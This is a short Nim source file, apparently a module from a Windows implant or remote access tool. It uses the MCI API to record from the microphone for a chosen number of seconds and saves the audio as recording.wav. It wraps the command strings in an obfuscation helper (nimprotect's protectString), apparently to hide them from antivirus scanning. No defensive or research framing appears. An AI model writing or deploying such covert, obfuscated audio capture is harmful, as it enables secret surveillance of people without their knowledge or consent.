import winim
import nimprotect
import os
import winim/com

proc record_mic*(record_time: int) = 
    if mciSendString(
        protectString("open new type waveaudio alias ") & "rec",
        "",
        0,
        0) != 0 or
       mciSendString(protectString("record ") & "rec",
        "",
        0,
        0) != 0:
        echo "shit broke"

    sleep(record_time * 1000)

    if mciSendString("save rec recording.wav", 
        "",
        0,
        0) != 0 or
       mciSendString("close rec",
        "",
        0,
        0) != 0:
        echo "shit broke"